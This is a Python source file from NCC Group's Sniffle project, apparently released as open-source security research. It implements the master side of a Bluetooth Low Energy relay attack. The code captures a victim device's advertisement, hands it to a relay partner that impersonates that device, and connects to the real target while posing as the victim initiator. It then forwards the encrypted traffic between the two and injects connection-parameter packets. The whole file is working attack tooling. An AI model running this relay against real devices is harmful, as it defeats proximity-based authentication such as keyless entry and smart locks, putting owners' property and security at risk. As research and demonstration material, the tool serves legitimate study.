#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020, NCC Group plc
# Released as open source under GPLv3

import argparse, sys
from binascii import unhexlify
from queue import Queue
from time import time
from select import select
from struct import pack, unpack

from pcap import PcapBleWriter
from sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, StateMessage, \
        MeasurementMessage, SnifferState
from packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, AdvIndMessage, \
        AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, str_mac, LlControlMessage
from relay_protocol import RelayServer, MessageType

"""
Relay attack principles:

A and S refer to the real advertiser/peripheral/slave
I_r and M_r refer to relay_master.py
A_r and S_r refer to relay_slave.py
I and M refer to the real initiator/central/master

Relay master script also has a network listener, relay slave connects to it.

First, the relay master (I_r) gathers the adverisement body and scan response
from the victim advertiser (A). Next, the advertisement data is passed onto
the relay slave (A_r) to mimic the victim advertiser. Once the victim
initiator (I) connects to the relay slave (A_r) mimicking the victim advertiser,
the relay slave will inform the relay master, so that it can start its own
connection to the real victim advertiser with potentially different parameters.

I               A_r             I_r             A
                                <----------Advert
                                ScanReq--------->
                                <---------ScanRsp
                <---------Advert
                <--------ScanRsp
<---------Advert
ScanReq-------->
<--------ScanRsp
ConnReq-------->
(I starts channel hopping with A_r)
                ConnReq-------->
                                (wait for next advert)
                                <----------Advert
                                ConnReq--------->

Once connected, data can be encrypted, but we don't care, we just pass it on.
One limitation is that encrypted LL_CONTROL messages could change hopping
parameters, but we can't decipher them. It may be possible to make an educated
guess of what the control messages are though based on past behaviour.

M               S_r             M_r             S
Encrypted------>
<----------Empty
                Encrypted----->
                                Encrypted------>
                                <--------EncResp
                <--------EncResp
(wait for next conn event)
Empty--------->
<-------EncResp
"""

# global variable to access hardware
hw = None

# global variable for pcap writer
pcwriter = None

def main():
    aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
            help="Advertising channel to listen on")
    aparse.add_argument("-m", "--mac", default=None, help="Specify target MAC address")
    aparse.add_argument("-i", "--irk", default=None, help="Specify target IRK")
    aparse.add_argument("-P", "--public", action="store_const", default=False, const=True,
            help="Supplied MAC address is public")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    aparse.add_argument("-Q", "--preload", default=None, help="Preload expected encrypted "
            "connection parameter changes")
    aparse.add_argument("-f", "--fastslave", action="store_const", default=False, const=True,
            help="Relay slave should request a fast connection interval")
    aparse.add_argument("-F", "--fastmaster", action="store_const", default=False, const=True,
            help="Relay master should specify a fast connection interval")
    aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
    args = aparse.parse_args()

    global hw
    hw = SniffleHW(args.serport)

    if args.mac is None and args.irk is None:
        print("Must specify target MAC address or IRK", file=sys.stderr)
        return
    if args.mac and args.irk:
        print("IRK and MAC filters are mutually exclusive!", file=sys.stderr)
        return
    if args.public and args.irk:
        print("IRK only works on RPAs, not public addresses!", file=sys.stderr)
        return

    # wait for relay slave to connect to us
    server = RelayServer()
    print("Waiting for relay slave to connect...")
    conn = server.accept()
    print("Got connection from", conn.peer_ip)

    # Network latency test
    stime = time()
    conn.send_msg(MessageType.PING, b'latency_test')
    mtype, body = conn.recv_msg()
    etime = time()
    if mtype != MessageType.PING or body != b'latency_test':
        raise ValueError("Unexpected message type in latency test")
    print("Round trip latency: %.1f ms" % ((etime - stime) * 1000))

    # give the relay slave the preloads if any
    if args.preload:
        conn.send_msg(MessageType.PRELOAD, bytes(args.preload, encoding='utf-8'))
    else:
        conn.send_msg(MessageType.PRELOAD, b'')

    if args.irk:
        macBytes = get_mac_from_irk(unhexlify(args.irk), args.advchan)
    else:
        try:
            macBytes = [int(h, 16) for h in reversed(args.mac.split(":"))]
            if len(macBytes) != 6:
                raise Exception("Wrong length!")
        except:
            print("MAC must be 6 colon-separated hex bytes", file=sys.stderr)
            return

    # obtain the target's advertisement and scan response, share it with relay slave
    adv, scan_rsp = scan_target(macBytes)
    conn.send_msg(MessageType.ADVERT, adv.body)
    conn.send_msg(MessageType.SCAN_RSP, scan_rsp.body)

    # relay slave will now impersonate our target

    # wait for relay slave to say who connected to it
    print("Waiting for relay slave to notify us of connection...")
    mtype, body = conn.recv_msg()
    if mtype != MessageType.CONN_REQ:
        raise ValueError("Unexpected message type %s" % mtype.name)
    conn_req = DPacketMessage.from_body(body)
    if not isinstance(conn_req, ConnectIndMessage):
        raise ValueError("CONN_REQ was not a CONN_REQ!")
    print("Relay slave notified us of connection request. Connecting to real target...")
    print(conn_req)

    global pcwriter
    if not (args.output is None):
        pcwriter = PcapBleWriter(args.output)

        pcwriter.write_packet(int(adv.ts_epoch * 1000000), adv.aa, adv.chan,
                adv.rssi, adv.body, adv.phy)
        pcwriter.write_packet(int(scan_rsp.ts_epoch * 1000000), scan_rsp.aa,
                scan_rsp.chan, scan_rsp.rssi, scan_rsp.body, scan_rsp.phy)
        pcwriter.write_packet(int(time() * 1000000), conn_req.aa, conn_req.chan,
                conn_req.rssi, conn_req.body, conn_req.phy)

    connector_addr = conn_req.InitA
    connector_random = bool(conn_req.TxAdd)
    if args.fastmaster:
        connector_interval = 6
        connector_latency = 0
    else:
        connector_interval = conn_req.Interval
        connector_latency = conn_req.Latency

    preloads = []
    if args.preload:
        # expect colon separated pairs, separated by commas
        preloads = []
        for tstr in args.preload.split(','):
            tsplit = tstr.split(':')
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)

    # connect to real target, impersonating who connected to relay slave
    connect_target(macBytes, args.advchan, not args.public, connector_addr,
            connector_random, connector_interval, connector_latency, preloads)

    # wait for transition to master state
    while True:
        msg = hw.recv_and_decode()
        if isinstance(msg, StateMessage) and msg.new_state == SnifferState.MASTER:
            hw.decoder_state.cur_aa = conn_req.aa_conn
            break
    print("Connected to target.", end='\n\n')

    # request legitimate master (relay slave) to use a fast connection interval
    # LL Control (0x03), length 24 (0x18), LL_CONNECTION_PARAM_REQ (0x0F)
    # interval: 0x0006 to 0x000A (7.5 to 15 ms)
    # latency: 0
    # timeout: 0x01F4 (5 seconds)
    # preferred periodicity: 3
    # reference event: 0x0005
    # offsets: 0x0001, 0x0002, 0x0003, 0x0004, 0x0005, 0x0000
    if args.fastslave:
        conn_update_pdu = DPacketMessage.from_body(b'\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03'
                b'\x05\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x00\x00')
        conn.send_msg(MessageType.PACKET, b'\x04\x00' + conn_update_pdu.body)

    filter_changes = args.fastslave or args.fastmaster

    while True:
        ready, _, _ = select([hw.ser.fd, conn.sock], [], [])

        if conn.sock in ready:
            sock_recv_print_forward(conn, args.quiet, filter_changes)
        if hw.ser.fd in ready:
            ser_recv_print_forward(conn, args.quiet, filter_changes)

def has_instant(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]

def is_param_req(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F

def sock_recv_print_forward(conn, quiet, filter_changes=False):
    # receive packets from relay slave and retransmit them here
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PACKET:
        return
    event, = unpack('<H', body[:2])
    body = body[2:]
    llid = body[0] & 3
    pdu = body[2:]

    # construct packet object for display and PCAP
    pkt = DPacketMessage.from_body(body, True)
    pkt.ts_epoch = time()
    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
    pkt.aa = hw.decoder_state.cur_aa
    pkt.event = event

    # Passing on PDUs with instants in the past would break the connection
    if not (filter_changes and has_instant(pkt)):
        hw.cmd_transmit(llid, pdu, event)
    print_message(pkt, quiet)

def ser_recv_print_forward(conn, quiet, filter_changes=False):
    msg = hw.recv_and_decode()

    if isinstance(msg, PacketMessage):
        msg = DPacketMessage.decode(msg)
        # only forward non-empty data
        empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
        block_req = filter_changes and is_param_req(msg)
        if not empty and not block_req:
            # Forward packets to the relay slave
            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
        if block_req:
            # LL_REJECT_EXT_IND, unacceptable connection parameters
            hw.cmd_transmit(3, b'\x11\x0F\x3B')

    print_message(msg, quiet)

def print_message(msg, quiet=False):
    if isinstance(msg, DPacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage) or \
            isinstance(msg, StateMessage) or \
            isinstance(msg, MeasurementMessage):
        print(msg, end='\n\n')

# assumes sniffer is already configured to receive ads with IRK filter
def get_mac_from_irk(irk, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_irk(irk, False)
    hw.cmd_auxadv(False)
    hw.mark_and_flush()

    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            print("Found target MAC: %s" % str_mac(dpkt.AdvA))
            return dpkt.AdvA

def scan_target(mac):
    advPkt = None
    scanRspPkt = None

    hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(mac, False)
    hw.cmd_auxadv(False) # we only support impersonating legacy advertisers for now
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    while (advPkt is None) or (scanRspPkt is None):
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            if advPkt is None:
                print("Found advertisement.")
            advPkt = dpkt
        elif isinstance(dpkt, ScanRspMessage):
            if scanRspPkt is None:
                print("Found scan response.")
            scanRspPkt = dpkt

    print("Target Advertisement:")
    print(advPkt)
    print()
    print("Target Scan Response:")
    print(scanRspPkt)
    print()

    return advPkt, scanRspPkt

def connect_target(targ_mac, chan=37, targ_random=True, initiator_mac=None, initiator_random=True,
        interval=24, latency=1, preloads=[]):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(targ_mac, False)
    hw.cmd_auxadv(False)
    hw.cmd_interval_preload(preloads)
    hw.cmd_phy_preload()
    if initiator_mac is None:
        hw.random_addr()
    else:
        hw.cmd_setaddr(initiator_mac, initiator_random)
    hw.mark_and_flush()

    # now enter initiator mode
    return hw.initiate_conn(targ_mac, targ_random, interval, latency)

def print_packet(pkt, quiet=False):
    is_not_empty = not (isinstance(pkt, LlDataContMessage) and pkt.data_length == 0)

    if not quiet or is_not_empty:
        print(pkt, end='\n\n')

    # Record the packet if PCAP writing is enabled
    if pcwriter and is_not_empty:
        if isinstance(pkt, DataMessage):
            pdu_type = 3 if pkt.data_dir else 2
        else:
            pdu_type = 0
        pcwriter.write_packet(int(pkt.ts_epoch * 1000000), pkt.aa, pkt.chan, pkt.rssi,
                pkt.body, pkt.phy, pdu_type)

if __name__ == "__main__":
    main()
